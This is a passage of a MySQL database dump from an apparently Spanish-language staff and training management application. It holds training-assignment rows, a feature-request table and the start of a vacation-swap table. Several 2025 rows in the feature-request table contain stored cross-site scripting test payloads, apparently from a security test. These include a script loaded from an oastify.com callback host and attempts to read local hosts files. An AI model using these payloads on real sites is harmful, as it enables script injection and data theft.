44,97,73,1,''),(445,97,81,1,''),(446,97,287,1,''),(447,97,143,1,''),(448,97,371,1,''),(449,97,234,1,''),(450,97,181,1,''),(451,97,276,1,''),(452,97,363,1,''),(453,97,197,1,''),(454,97,358,1,''),(455,97,356,1,''),(456,97,133,1,''),(457,97,336,1,''),(458,97,140,1,''),(459,97,200,1,''),(460,97,367,1,''),(461,97,126,1,''),(462,97,129,1,''),(463,96,378,1,''),(465,96,180,1,''),(466,96,102,1,''),(467,96,1000,1,''),(468,96,189,1,''),(469,96,233,1,''),(470,96,218,1,''),(471,96,217,1,''),(472,96,284,1,''),(473,96,241,1,''),(475,96,366,1,''),(477,96,207,1,''),(478,96,380,1,''),(479,96,191,1,''),(480,96,228,1,''),(481,96,382,1,''),(482,96,159,1,''),(483,96,225,1,''),(484,96,88,1,''),(485,96,136,1,''),(486,96,198,1,''),(487,96,63,1,''),(488,96,167,1,''),(489,96,179,1,''),(490,96,291,1,''),(491,96,277,1,''),(492,96,190,1,''),(493,96,155,1,''),(494,96,150,1,''),(495,96,229,1,''),(496,96,89,1,''),(497,96,370,1,''),(498,96,395,1,''),(499,96,192,1,''),(500,96,171,1,''),(501,96,193,1,''),(502,96,202,1,''),(503,96,201,1,''),(504,96,239,1,''),(505,96,247,1,''),(506,96,379,1,''),(507,96,178,1,''),(508,96,73,1,''),(509,96,81,1,''),(510,96,287,1,''),(511,96,143,1,''),(512,96,371,1,''),(513,96,234,1,''),(514,96,181,1,''),(515,96,276,1,''),(516,96,363,1,''),(517,96,197,1,''),(518,96,358,1,''),(519,96,356,1,''),(520,96,133,1,''),(521,96,336,1,''),(522,96,140,1,''),(523,96,200,1,''),(524,96,367,1,''),(525,96,126,1,''),(526,96,129,1,''),(528,93,102,1,''),(529,90,381,1,''),(530,83,395,1,''),(532,98,201,1,''),(533,98,413,1,''),(534,98,287,1,''),(535,98,402,1,''),(536,98,418,1,''),(537,98,417,1,''),(538,98,405,1,''),(539,99,417,1,''),(540,99,418,1,''),(541,100,417,1,''),(542,100,413,1,''),(543,100,418,1,''),(544,101,417,1,''),(545,101,418,1,''),(546,102,417,1,''),(547,102,418,1,''),(548,102,413,1,''),(549,103,417,1,''),(550,103,418,1,''),(551,103,413,1,''),(552,104,418,1,''),(554,104,406,1,''),(555,104,405,0,'acude en dГӯa de vacaciones'),(556,105,367,1,''),(557,104,407,1,''),(558,106,180,1,''),(559,106,241,1,''),(560,106,190,1,''),(561,106,244,1,''),(562,106,159,1,''),(563,106,381,1,''),(564,106,196,1,''),(565,106,239,1,''),(566,106,193,1,''),(567,107,418,1,''),(569,107,406,1,''),(571,107,413,1,''),(572,109,421,1,''),(573,109,423,1,''),(574,109,422,1,''),(575,109,424,1,''),(576,109,413,1,''),(577,109,426,1,''),(578,109,425,1,''),(579,108,421,1,''),(580,108,423,1,''),(581,108,422,1,''),(582,108,424,1,''),(583,108,413,1,''),(584,110,421,1,''),(585,110,423,1,''),(586,110,424,1,''),(587,110,422,1,''),(588,110,425,1,''),(589,110,426,1,''),(590,111,421,1,''),(591,111,423,1,''),(592,111,422,1,''),(593,111,424,1,''),(594,111,425,1,''),(595,111,426,1,''),(596,112,421,1,''),(597,112,423,1,''),(598,112,422,1,''),(599,112,424,1,''),(600,112,425,1,''),(601,112,426,1,''),(602,113,421,1,''),(603,113,423,1,''),(604,113,422,1,''),(605,113,424,1,''),(606,113,425,1,''),(607,113,426,1,''),(608,118,425,1,''),(609,118,426,1,''),(610,114,421,1,''),(611,114,423,1,''),(612,114,422,1,''),(613,114,424,1,''),(614,114,425,1,''),(615,114,426,1,''),(617,115,423,1,''),(618,115,422,1,''),(619,115,424,1,''),(620,115,425,1,''),(621,115,426,1,''),(622,116,423,1,''),(623,116,422,1,''),(624,116,424,1,''),(625,116,425,1,''),(626,116,426,1,''),(627,117,423,1,''),(628,117,422,1,''),(629,117,424,1,''),(630,117,425,1,''),(631,117,426,1,''),(632,117,421,1,''),(633,116,421,1,''),(634,115,421,1,''),(635,119,427,1,''),(636,119,428,1,''),(637,119,429,1,''),(640,121,427,1,''),(641,121,428,1,''),(642,121,429,1,''),(643,122,427,1,''),(644,122,428,1,''),(645,122,429,1,''),(646,123,427,1,''),(647,123,429,1,''),(648,123,428,1,''),(649,124,427,1,''),(650,124,429,1,''),(651,124,428,1,''),(652,125,427,1,''),(653,125,429,1,''),(654,125,428,1,''),(655,126,427,1,''),(656,126,429,1,''),(657,126,428,1,''),(658,127,423,1,''),(659,127,421,1,''),(660,127,422,1,''),(661,127,424,1,''),(663,127,407,1,''),(664,127,413,1,''),(665,128,421,1,''),(666,128,423,1,''),(667,128,422,1,''),(668,128,424,1,''),(669,128,413,1,''),(670,128,407,1,''),(671,129,407,1,''),(672,130,407,1,''),(673,130,431,1,''),(674,130,432,1,''),(675,129,432,1,''),(676,131,431,1,''),(677,131,407,1,''),(678,131,432,1,''),(679,127,432,1,''),(680,127,431,1,''),(681,128,431,1,''),(682,128,432,1,''),(683,135,431,1,''),(684,135,407,1,''),(685,135,432,1,''),(686,132,431,1,''),(687,132,407,1,''),(688,132,432,1,''),(689,133,431,1,''),(690,133,407,1,''),(691,133,432,1,''),(692,134,431,1,''),(693,134,407,1,''),(694,134,432,1,''),(695,137,427,1,''),(696,137,429,1,''),(697,137,428,1,''),(698,137,407,1,''),(699,137,435,1,''),(700,138,435,1,''),(701,139,435,1,''),(702,140,435,1,''),(703,141,435,1,''),(705,143,435,1,''),(706,144,442,1,''),(707,142,442,1,''),(708,142,418,1,''),(709,145,435,1,''),(710,145,431,1,''),(711,146,442,1,''),(712,147,442,1,'formacion inicial Tecncio Red Habilitado'),(713,148,442,1,''),(714,149,442,1,''),(715,150,428,1,''),(716,151,428,1,''),(720,152,63,1,''),(721,153,202,1,''),(722,153,371,1,''),(723,153,394,1,''),(724,154,306,1,''),(725,154,253,1,''),(726,154,363,1,''),(727,155,136,1,''),(728,155,395,1,''),(729,155,380,1,''),(730,156,245,1,''),(731,156,277,1,''),(732,156,89,1,''),(733,152,167,1,''),(734,159,443,1,''),(735,160,443,1,''),(736,161,443,1,''),(737,163,378,1,''),(738,164,293,1,''),(739,164,379,1,''),(740,158,450,1,''),(741,158,451,1,''),(742,157,450,1,''),(743,157,451,1,''),(744,165,450,1,''),(745,165,451,1,''),(746,166,451,1,''),(747,166,450,1,''),(748,167,451,1,''),(749,167,450,1,''),(750,168,81,1,''),(751,168,423,1,''),(752,168,407,1,''),(753,168,427,1,''),(754,168,228,1,''),(755,169,200,1,''),(756,169,422,1,''),(759,169,234,1,''),(760,169,413,1,''),(761,170,201,1,''),(762,170,450,1,''),(763,170,150,1,''),(764,170,181,1,''),(765,171,425,1,''),(767,171,402,1,''),(768,171,431,1,''),(769,172,171,1,''),(772,172,448,1,''),(773,173,198,1,''),(774,173,451,1,''),(775,173,229,1,''),(776,169,143,1,''),(777,171,429,1,''),(778,172,233,1,''),(779,173,435,1,''),(780,172,287,0,'en dia de vacaciones'),(781,177,422,1,''),(782,177,425,1,''),(783,178,423,1,''),(785,178,449,1,''),(786,178,451,1,''),(787,179,448,1,''),(788,179,450,1,''),(790,174,424,1,''),(791,174,448,1,''),(792,175,422,1,''),(793,175,425,1,''),(794,175,450,1,''),(795,175,451,1,''),(797,176,443,1,''),(798,176,449,1,''),(799,179,427,1,''),(800,178,431,1,''),(802,176,429,1,''),(804,175,421,1,''),(805,175,431,1,''),(806,175,435,1,''),(808,177,421,1,''),(809,177,429,1,''),(810,177,435,1,''),(811,174,413,1,''),(812,175,427,1,''),(813,180,457,1,''),(814,180,456,1,''),(815,180,455,1,''),(816,181,457,1,''),(817,181,456,1,''),(818,181,455,1,''),(819,182,457,1,''),(820,182,456,1,''),(821,182,455,1,''),(822,183,456,1,''),(823,183,457,1,''),(824,183,455,1,''),(825,184,456,1,''),(826,184,457,1,''),(827,184,455,1,''),(828,186,456,1,''),(829,186,457,1,''),(830,186,455,1,''),(831,185,456,1,''),(832,185,457,1,''),(833,185,455,1,''),(834,187,456,1,''),(835,187,457,1,''),(836,187,455,1,''),(837,183,458,1,''),(838,181,458,1,''),(839,180,458,1,''),(840,182,458,1,''),(841,186,458,1,''),(842,184,458,1,''),(843,185,458,1,''),(844,187,458,1,''),(845,188,456,1,''),(846,188,457,1,''),(847,188,455,1,''),(848,188,458,1,''),(849,181,459,1,''),(850,180,459,1,''),(851,182,459,1,''),(852,183,459,1,''),(853,186,459,1,''),(854,184,459,1,''),(855,185,459,1,''),(856,187,459,1,''),(857,188,459,1,''),(858,190,239,1,''),(859,190,428,1,''),(860,190,432,1,''),(861,189,432,1,''),(862,189,424,1,''),(863,191,197,1,''),(864,191,291,1,''),(865,195,180,1,''),(866,195,193,1,''),(867,195,393,1,''),(868,194,379,1,''),(869,194,192,1,''),(871,194,432,1,''),(873,192,218,0,''),(876,192,217,1,''),(877,193,178,0,''),(878,193,382,1,''),(879,193,293,1,''),(881,191,423,1,''),(882,189,426,1,''),(883,190,426,1,''),(884,195,367,1,''),(885,195,276,1,''),(886,196,428,1,''),(887,196,450,1,''),(888,196,451,1,''),(889,196,457,1,''),(890,196,429,1,''),(891,196,458,1,''),(892,196,455,1,''),(893,197,451,1,''),(894,197,429,1,''),(895,197,457,1,''),(896,197,455,1,''),(897,197,428,1,''),(898,197,450,1,''),(899,197,458,1,''),(900,195,428,1,''),(901,194,190,1,''),(902,198,217,1,''),(903,198,382,1,''),(904,198,427,1,''),(905,198,429,1,''),(906,198,422,1,''),(907,198,424,1,''),(908,198,293,1,''),(909,198,435,1,''),(910,198,379,1,''),(911,198,143,1,''),(912,198,407,1,''),(913,198,413,1,''),(914,171,449,1,''),(915,199,379,1,''),(916,199,455,1,''),(918,199,443,1,''),(919,199,247,1,''),(920,199,459,1,''),(921,199,81,1,''),(922,199,293,1,''),(924,199,378,1,''),(925,199,217,1,''),(926,199,380,1,''),(927,199,253,1,''),(928,199,394,1,''),(929,199,229,1,''),(930,199,228,1,''),(931,199,287,1,''),(932,208,178,1,''),(933,208,367,1,''),(934,208,422,1,''),(935,208,432,1,''),(936,208,393,1,''),(937,208,207,1,''),(938,208,291,1,''),(940,208,197,1,''),(941,208,198,1,''),(942,209,218,1,''),(943,209,276,1,''),(944,209,277,1,''),(945,209,421,1,''),(947,210,245,1,''),(948,210,413,1,''),(949,211,382,1,''),(950,211,363,1,''),(951,211,418,1,''),(952,211,143,1,''),(953,211,402,1,''),(954,211,180,1,''),(955,211,239,1,''),(956,211,196,1,''),(957,211,201,1,''),(958,211,451,1,''),(959,211,457,1,''),(960,212,427,1,''),(961,212,426,1,''),(962,212,435,1,''),(963,212,159,1,''),(964,212,450,1,''),(965,212,448,1,''),(966,212,458,1,''),(967,213,193,1,''),(968,213,241,1,''),(969,213,244,1,''),(970,213,449,1,''),(971,213,171,1,''),(972,213,202,1,''),(973,213,371,1,''),(974,209,407,1,''),(975,213,233,1,''),(976,214,306,1,''),(977,214,395,1,''),(978,215,234,1,''),(979,216,167,1,''),(980,216,89,1,''),(981,216,181,1,''),(982,216,192,1,''),(983,216,292,1,''),(984,216,150,1,''),(985,216,456,1,''),(987,208,200,1,''),(988,217,458,1,''),(990,217,292,1,''),(991,218,197,1,''),(992,218,455,1,''),(993,218,456,1,''),(994,217,459,1,''),(997,217,89,1,''),(998,217,202,1,''),(999,217,363,1,''),(1000,218,167,1,''),(1002,218,407,1,''),(1005,218,253,0,'en un dia de vacaciones'),(1006,219,178,1,''),(1007,219,382,1,''),(1008,219,293,1,''),(1009,219,379,1,''),(1010,220,218,1,''),(1011,220,276,1,''),(1012,220,378,1,''),(1013,220,367,1,''),(1014,221,217,1,''),(1015,221,167,1,''),(1016,221,306,1,''),(1017,221,293,1,''),(1018,221,89,1,''),(1019,221,253,1,''),(1020,221,394,1,''),(1021,222,395,1,'DISPONIBILIDAD'),(1022,222,202,1,''),(1023,222,276,1,''),(1024,222,402,1,''),(1025,221,196,1,''),(1027,223,449,1,''),(1028,223,448,1,''),(1029,223,467,1,''),(1030,223,465,1,''),(1031,223,464,1,''),(1032,223,469,1,''),(1033,224,244,1,''),(1034,224,448,1,''),(1035,224,456,1,''),(1036,224,459,1,''),(1037,224,465,1,''),(1038,224,467,1,''),(1039,225,448,1,''),(1040,225,456,1,''),(1041,225,459,1,''),(1042,225,465,1,''),(1043,225,467,1,''),(1051,227,467,1,''),(1052,227,465,1,''),(1053,227,464,1,''),(1055,228,464,1,''),(1056,228,467,1,''),(1057,228,465,1,''),(1058,228,469,1,''),(1061,227,469,1,''),(1062,229,190,1,''),(1063,229,393,1,''),(1064,229,378,1,''),(1065,229,192,1,''),(1066,229,178,1,''),(1067,229,382,1,''),(1070,229,379,1,'13 diciembre'),(1071,229,293,1,'13 diciembre'),(1072,229,218,1,'15/12/2022'),(1073,230,192,1,''),(1074,230,459,1,''),(1075,230,379,1,''),(1076,230,292,1,''),(1077,230,443,1,''),(1078,230,196,1,''),(1080,230,193,1,''),(1081,230,239,1,''),(1082,230,159,1,''),(1083,230,428,1,''),(1084,230,456,1,''),(1086,230,458,1,''),(1087,230,457,1,''),(1088,230,448,1,''),(1089,230,455,1,''),(1090,230,81,1,''),(1091,230,171,1,''),(1092,229,428,1,''),(1093,230,180,1,''),(1094,230,465,1,''),(1095,230,198,1,''),(1096,229,193,1,''),(1097,230,467,1,''),(1098,230,393,1,''),(1099,231,464,1,''),(1100,231,469,1,''),(1101,231,456,1,''),(1102,231,458,1,''),(1103,231,459,1,''),(1104,231,180,1,''),(1105,231,292,1,''),(1106,232,276,1,''),(1107,232,293,1,''),(1108,232,428,1,''),(1109,232,190,1,''),(1110,233,193,1,''),(1111,233,455,1,''),(1112,233,201,1,''),(1113,233,171,1,''),(1114,234,369,1,''),(1115,235,369,1,''),(1116,236,369,1,''),(1117,237,369,1,''),(1118,238,378,1,''),(1119,238,379,1,''),(1120,238,367,1,''),(1121,239,218,1,''),(1122,239,217,1,''),(1123,239,382,1,''),(1124,240,218,1,''),(1125,240,379,1,''),(1126,240,178,1,''),(1127,240,287,1,''),(1128,240,371,1,''),(1129,240,363,1,''),(1130,240,181,1,''),(1131,241,369,1,''),(1132,242,200,1,''),(1133,242,207,1,''),(1134,243,180,1,''),(1135,243,192,1,''),(1136,243,239,1,''),(1137,243,159,1,''),(1138,244,477,1,''),(1139,245,475,1,''),(1140,245,476,1,''),(1141,245,478,1,''),(1142,245,479,1,''),(1143,246,378,1,''),(1144,246,276,1,''),(1145,247,382,1,''),(1146,247,367,1,''),(1147,247,378,1,''),(1148,247,380,1,''),(1149,247,475,1,''),(1150,247,476,1,''),(1152,250,247,1,''),(1153,250,244,1,''),(1154,249,479,1,''),(1155,249,477,1,''),(1156,251,367,1,''),(1157,250,245,1,''),(1158,250,179,1,''),(1159,252,202,1,''),(1160,252,464,1,''),(1161,252,426,1,''),(1162,252,291,1,''),(1163,252,482,1,''),(1164,252,247,1,''),(1165,254,475,1,''),(1166,254,476,1,''),(1167,254,478,1,''),(1168,254,479,1,''),(1169,254,477,1,''),(1170,253,475,1,''),(1171,253,476,1,''),(1172,253,478,1,''),(1173,253,477,1,''),(1174,253,479,1,''),(1175,256,180,1,''),(1176,256,428,1,''),(1177,256,192,1,''),(1178,255,180,1,''),(1179,255,193,1,''),(1180,255,393,1,''),(1181,257,428,1,''),(1182,257,247,1,''),(1183,258,193,1,''),(1184,258,247,1,''),(1185,255,218,1,''),(1186,255,217,1,''),(1187,255,178,1,''),(1188,255,276,1,''),(1190,255,382,1,''),(1191,256,218,1,''),(1192,256,217,1,''),(1194,257,379,1,''),(1195,260,469,1,''),(1196,260,464,1,''),(1197,260,369,1,''),(1198,260,487,1,''),(1199,259,464,1,''),(1200,259,469,1,''),(1201,259,369,1,''),(1202,259,487,1,''),(1203,258,178,1,''),(1204,258,276,1,''),(1205,258,379,1,''),(1207,258,367,1,''),(1208,257,367,1,''),(1209,260,486,1,''),(1210,260,485,1,''),(1211,260,489,1,''),(1212,260,490,1,''),(1213,260,492,1,''),(1214,260,491,1,''),(1215,259,486,1,''),(1216,259,485,1,''),(1217,259,489,1,''),(1218,259,490,1,''),(1219,259,492,1,''),(1220,259,491,1,''),(1221,260,482,1,''),(1222,259,482,1,''),(1223,261,443,1,''),(1225,261,455,1,''),(1226,261,483,1,''),(1227,261,167,1,''),(1228,261,394,1,''),(1229,261,363,1,''),(1230,261,429,1,''),(1231,261,423,1,''),(1232,262,207,1,''),(1233,262,450,1,''),(1234,262,486,1,''),(1235,262,458,1,''),(1236,262,306,1,''),(1237,262,424,1,''),(1238,262,476,1,''),(1239,262,479,1,''),(1240,263,239,1,''),(1241,263,456,1,''),(1242,263,482,1,''),(1243,263,245,1,''),(1244,263,380,1,''),(1245,263,202,1,''),(1246,263,418,1,''),(1247,263,407,1,''),(1248,264,197,1,''),(1249,264,196,1,''),(1250,264,465,1,''),(1251,264,485,1,''),(1252,264,421,1,''),(1253,264,253,1,''),(1254,264,402,1,''),(1255,264,464,1,''),(1256,265,451,1,''),(1257,265,291,1,''),(1259,265,459,1,''),(1260,265,469,1,''),(1261,265,371,1,''),(1262,265,478,1,''),(1263,261,244,1,''),(1264,265,292,1,''),(1265,266,465,1,''),(1266,266,467,1,''),(1267,266,482,1,''),(1268,266,483,1,''),(1269,266,486,1,''),(1270,266,490,1,''),(1271,266,492,1,''),(1272,266,487,1,''),(1273,266,479,1,''),(1274,266,478,1,''),(1276,267,450,1,''),(1279,267,394,1,''),(1280,267,424,1,''),(1281,271,483,1,''),(1282,271,486,1,''),(1283,271,490,1,''),(1284,271,492,1,''),(1287,271,491,1,''),(1290,269,363,1,''),(1291,269,455,1,''),(1292,269,393,1,''),(1293,269,499,1,''),(1294,269,245,1,''),(1295,269,306,1,''),(1296,269,418,1,''),(1297,269,483,1,''),(1298,269,394,1,''),(1299,268,380,1,''),(1300,268,429,1,''),(1302,268,367,1,''),(1303,268,424,1,''),(1304,268,469,1,''),(1305,268,451,1,''),(1306,268,458,1,''),(1307,270,424,1,''),(1308,270,394,1,''),(1309,267,451,1,''),(1310,272,490,1,''),(1311,272,467,1,''),(1312,272,455,1,''),(1313,272,465,1,''),(1315,273,483,1,''),(1318,273,459,1,''),(1322,274,491,1,''),(1323,274,369,1,''),(1324,274,423,1,''),(1325,274,475,1,''),(1326,275,427,1,''),(1327,275,435,1,''),(1328,275,181,1,''),(1330,275,464,1,''),(1332,275,487,1,''),(1333,273,393,1,''),(1334,273,201,1,''),(1335,276,499,1,''),(1336,276,505,1,''),(1337,276,506,1,''),(1338,276,507,1,''),(1339,276,508,1,''),(1340,276,509,1,''),(1341,276,510,1,''),(1345,278,505,1,''),(1346,278,499,1,''),(1347,278,507,1,''),(1348,278,510,1,''),(1349,278,508,1,''),(1350,278,509,1,''),(1351,278,506,1,''),(1352,280,505,1,''),(1353,280,499,1,''),(1354,280,507,1,''),(1355,280,508,1,''),(1356,280,510,1,''),(1357,280,509,1,''),(1358,280,506,1,''),(1359,280,487,1,''),(1360,280,478,1,''),(1362,279,507,1,''),(1363,279,505,1,''),(1364,279,508,1,''),(1365,279,506,1,''),(1366,279,509,1,''),(1367,279,510,1,''),(1368,279,402,1,''),(1369,279,371,1,''),(1370,279,421,1,''),(1371,279,253,1,''),(1372,282,505,1,''),(1373,282,506,1,''),(1374,282,507,1,''),(1375,282,508,1,''),(1376,282,509,1,''),(1377,282,510,1,''),(1378,282,499,1,''),(1379,283,517,1,''),(1380,283,514,1,''),(1381,283,518,1,''),(1382,283,513,1,''),(1383,283,515,1,''),(1384,283,512,1,''),(1385,283,516,1,''),(1386,284,517,1,''),(1387,284,514,1,''),(1388,284,518,1,''),(1389,284,513,1,''),(1390,284,515,1,''),(1391,284,516,1,''),(1392,284,512,1,''),(1393,284,519,1,''),(1394,283,519,1,''),(1395,285,517,1,''),(1396,285,514,1,''),(1397,285,512,1,''),(1398,285,516,1,''),(1399,285,515,1,''),(1400,285,519,1,''),(1401,285,513,1,''),(1402,285,518,1,''),(1403,286,517,1,''),(1404,286,514,1,''),(1405,286,512,1,''),(1406,286,516,1,''),(1407,286,519,1,''),(1408,286,513,1,''),(1409,286,518,1,''),(1410,286,515,1,''),(1411,286,485,1,''),(1412,286,482,1,''),(1413,285,485,1,''),(1414,287,519,1,''),(1415,287,517,1,''),(1416,287,514,1,''),(1417,287,516,1,''),(1418,287,518,1,''),(1419,287,513,1,''),(1420,287,450,1,''),(1421,287,459,1,''),(1422,287,190,1,''),(1423,287,378,1,''),(1424,287,276,1,''),(1425,288,524,1,''),(1426,288,523,1,''),(1427,288,449,1,''),(1428,289,505,1,''),(1429,289,456,1,''),(1430,289,458,1,''),(1431,289,81,1,''),(1432,290,514,1,''),(1433,290,499,1,''),(1434,290,518,1,''),(1435,291,522,1,''),(1436,291,426,1,''),(1437,291,417,1,''),(1438,291,506,1,''),(1439,292,479,1,''),(1440,292,287,1,''),(1441,292,478,1,''),(1442,292,407,1,'');
/*!40000 ALTER TABLE `agentes_formations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cambios_mejoras`
--

DROP TABLE IF EXISTS `cambios_mejoras`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cambios_mejoras` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `tipo` enum('Mejora','Mal funcionamiento','Cambio Funcionamiento') NOT NULL,
  `observacion` text NOT NULL,
  `realizado` tinyint(1) NOT NULL DEFAULT 0,
  `created` datetime DEFAULT NULL,
  `modified` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `cambios_mejoras_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE SET NULL ON UPDATE NO ACTION
) ENGINE=InnoDB AUTO_INCREMENT=53 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cambios_mejoras`
--

LOCK TABLES `cambios_mejoras` WRITE;
/*!40000 ALTER TABLE `cambios_mejoras` DISABLE KEYS */;
INSERT INTO `cambios_mejoras` VALUES (1,9,'Mejora','Reconocimientos mГ©dicos solo debe mostrar en la lista index el ultimo reconocimiento',1,'2018-01-12 00:00:00','2018-01-14 18:53:45'),(2,9,'Mejora','Exportar a excel los asistentes a un curso',1,'2018-01-12 18:30:24','2018-01-15 12:23:45'),(3,9,'Mejora','Exportar a Excel resumen de agentes',1,'2018-01-14 17:20:42','2018-01-14 17:20:42'),(5,9,'Cambio Funcionamiento','Quitar Ermua de Resdencias e Inspector de categorГӯas',1,'2018-01-15 11:55:21','2018-01-15 16:15:12'),(6,9,'Mejora','Crear un campo de estado de agente: Liberado, desplazado, baja etc',1,'2018-01-15 11:56:19','2018-01-16 07:54:57'),(7,9,'Mejora','Ocultar campos de Creado y modificado',1,'2018-01-15 11:57:47','2018-01-15 16:16:56'),(8,9,'Mejora','Filtrar en el modulo de residencias por el puesto de gestiГіn',1,'2018-01-15 11:58:43','2018-01-16 08:04:25'),(9,9,'Mejora','Nuevo modulo de lugar de reconocimiento medico',1,'2018-01-15 11:59:13','2018-01-16 08:04:37'),(10,9,'Mejora','Ordenar los reconocimientos mГ©dicos de gorma inversa, de mas antiguo a mas nuevo',1,'2018-01-15 11:59:48','2018-01-16 08:04:49'),(11,9,'Mejora','Boton de retroceso: volver a la ultima ventana en lugar de index.\r\nTambiГ©n se puede aГұadir un botГіn para ir al index',1,'2018-01-15 12:00:53','2018-01-16 08:46:57'),(12,9,'Mal funcionamiento','En ventanas de editar y aГұadir donde hay que elegir el agente cambiar texto por Agente',1,'2018-01-15 12:01:49','2018-01-16 08:35:22'),(13,9,'Mejora','DГӯas pedidos trabajador: \r\ncampo para indicar si debe o no debe el dГӯa.\r\nOrdenar por fecha correctamente descendente\r\nCheck de respuesta (si, no, pendiente)',1,'2018-01-15 12:21:30','2018-02-02 21:09:32'),(14,9,'Cambio Funcionamiento','CГіmputos:\r\nPosibilidad de elegir varios dГӯas consecutivos.\r\nAgregarlo a dГӯas pedidos trabajador sin contabilizar como deuda.',1,'2018-01-15 12:23:08','2018-02-07 18:27:06'),(15,9,'Mal funcionamiento','Pantalla resumen no ordena por fecha reconocimiento',1,'2018-01-16 06:09:38','2018-01-18 18:22:43'),(16,9,'Mejora','Copiar un dГӯa de computo y cambiar fecha',0,'2018-01-17 06:39:25','2018-01-17 06:39:25'),(17,9,'Mejora','Al crear un nuevo agente que el combo de estado aparezca DISPONIBLE por defecto',1,'2018-01-18 09:38:30','2018-01-18 18:06:47'),(18,9,'Mejora','En la pantalla de aГұadir asisten a formaciГіn el botГіn atrГЎs tiene que volver al Гӯndice de acciones formativas',1,'2018-01-18 09:40:23','2018-01-18 18:03:43'),(19,9,'Mejora','Al exportar los asistentes de un curso exportar primero por fecha y luego por apellido',1,'2018-01-18 09:40:59','2018-01-18 18:03:28'),(20,9,'Mejora','EXPORTACION AGENTES COMPROBAR EXPORTACION INCLUIR DNI',1,'2018-01-19 10:55:37','2018-01-19 20:05:03'),(21,9,'Mejora','Computos: poner filtro de aГұo con desplegable, cambiar el aГұo y poner uno menos ',1,'2018-01-22 08:02:07','2018-01-24 06:52:18'),(22,9,'Mejora','En cursos filtro para agentes y categorГӯas.\r\nPor agentes segГәn tengas elegida la zona en preferencias\r\nPor categorГӯas asignar al curso un nuevo campo de categorias a las que esta destinado',1,'2018-01-29 12:13:20','2018-02-02 21:07:35'),(23,9,'Mejora','En aГұadir de formacion poner la misma fecha en inicio y fin al cambiar',1,'2018-01-29 12:25:57','2018-02-02 21:07:40'),(32,9,'Mejora','AГұadir filtro de aГұo para dГӯa adicional de vacaciones',1,'2018-02-05 13:00:11','2018-02-07 18:15:33'),(33,9,'Mejora','Al validar un dГӯa solicitado por el trabajador preguntar si se quiere pasar al computo y pasarlo al computo si procede',1,'2018-02-06 07:21:42','2018-02-16 11:45:09'),(34,9,'Mal funcionamiento','Computos ordenar por correctamente por horas y no por texto',1,'2018-02-07 11:32:22','2018-02-07 18:15:28'),(35,9,'Mejora','Envio de correo al aceptar un dГӯa solicitado',0,'2018-02-20 09:21:45','2018-02-20 09:21:45'),(36,9,'Mejora','preubas 2',0,'2018-10-04 09:12:08','2018-10-04 09:12:08'),(37,20,'Mejora','hola',0,'2018-10-04 09:15:07','2018-10-04 09:15:07'),(38,20,'Mejora','Prueba Erlantz',0,'2018-10-04 09:32:08','2018-10-04 09:32:08'),(39,20,'Mejora','Prueba2',0,'2018-10-04 09:35:10','2018-10-04 09:35:10'),(40,20,'Mejora','Prueba3',0,'2018-10-04 10:36:54','2018-10-04 10:36:54'),(41,158,'Mejora','<h1>test</h1>',0,'2025-06-26 09:21:24','2025-06-26 09:21:24'),(42,158,'Mejora','<script>alert(1)</script>',0,'2025-06-26 09:22:26','2025-06-26 09:22:26'),(43,158,'Mejora','<iframe src=\"/etc/passwd\"></iframe>',0,'2025-06-26 09:25:42','2025-06-26 09:25:42'),(44,159,'Mejora','Esto es una prueba\r\n\r\n\r\n<<SCRIPT>alert(\"XSS\");//<</SCRIPT>\r\n\r\n',0,'2025-06-26 09:25:44','2025-06-26 10:55:27'),(45,158,'Mejora','<script src=\'https://t2w8itt2lurmnm5yc4tlwx3gb7hy51tq.oastify.com/evil.js\'/><script>',0,'2025-06-26 09:28:12','2025-06-26 09:28:12'),(46,158,'Mejora','<script>document.write(document.location.href)</script>',0,'2025-06-26 09:32:55','2025-06-26 09:32:55'),(47,158,'Mejora','<script>x=new XMLHttpRequest;x.onload=function() document.write(this.responseText)};x.open(\'GET\',\'file:///etc/hosts\');x.send();</script>',0,'2025-06-26 09:33:56','2025-06-26 09:33:56'),(48,158,'Mejora','aa',0,'2025-06-26 09:34:25','2025-06-26 09:36:59'),(49,158,'Mejora','test',0,'2025-06-26 09:35:03','2025-06-26 09:38:28'),(50,158,'Mejora','<script>x=new XMLHttpRequest();x.onload=function(){document.write(this.responseText)};x.open(\'GET\',\'file:///C:/Windows/System32/drivers/etc/hosts\');x.send();</script>',0,'2025-06-26 09:38:06','2025-06-26 09:38:39'),(51,158,'Mejora','<script>document.write(\'<iframe src=file:///C:/Windows/System32/drivers/etc/hosts></iframe>\');</scrip>\r\n',0,'2025-06-26 09:39:11','2025-06-26 09:39:11'),(52,159,'Mejora','Prueba 2\r\n',0,'2025-06-26 10:49:51','2025-06-26 10:50:50');
/*!40000 ALTER TABLE `cambios_mejoras` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cambios_vacaciones`
--

DROP TABLE IF EXISTS `cambios_vacaciones`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cambios_vacaciones` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `codigo_agente1` int(11) NOT NULL,
  `fecha_inicio1` date NOT NULL,
  `fecha_fin1` date NOT NULL,
  `codigo_agente2` int(11) DEFAULT NULL,
  `fecha_inicio2` date NOT NULL,
  `fecha_fin2` date NOT NULL,
  `motivo` text DEFAULT NULL,
  `status` int(11) NOT NULL DEFAULT 1,
  `created` datetime NOT NULL,
  `modified` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `codigo_agente1` (`codigo_agente1`),
  KEY `codigo_agente2` (`codigo_agente2`),
  CONSTRAINT `cambios_vacaciones_ibfk_1` FOREIGN KEY (`codigo_agente1`) REFERENCES `agentes` (`codigo_agente`) ON DELETE CASCADE ON UPDATE NO ACTION,
